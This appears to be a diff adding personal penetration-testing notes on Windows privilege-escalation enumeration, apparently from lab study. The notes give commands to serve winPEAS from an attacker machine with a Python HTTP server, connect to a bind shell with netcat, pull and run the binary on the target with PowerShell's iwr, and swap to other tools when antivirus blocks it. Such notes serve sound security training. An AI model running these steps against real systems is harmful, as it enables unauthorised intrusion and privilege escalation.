@@ -1,0 +1,19 @@
+- [If there is no color use this:]
+	- `REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1`
+- If blocked by AV --> use Seatbelt or JAWS
+		- google **compiled seatbelt github download**
+	- package = peass
+	- 
+- Example:
+		- Copy 64-bit binary of winPEAS to home directory and serve it with Python server
+			- ```cp /usr/share/peass/winpeas/winPEASx64.exe .```
+			- ```python3 -m http.server 80```
+		- Connect to bind shell
+			- `nc 192.168.50.220 4444`
+		- powershell
+		- Grab the file from host using iwr Cmdlet
+			- ```iwr -uri http://192.168.45.204/winPEASx64.exe -Outfile winPEAS.exe```
+			- ```.\winPEAS.exe```
+		- Check  transcript history if winPEAS missed
+			- C:\Users\Public
+		- Manually check in case winPEAS misses stuff
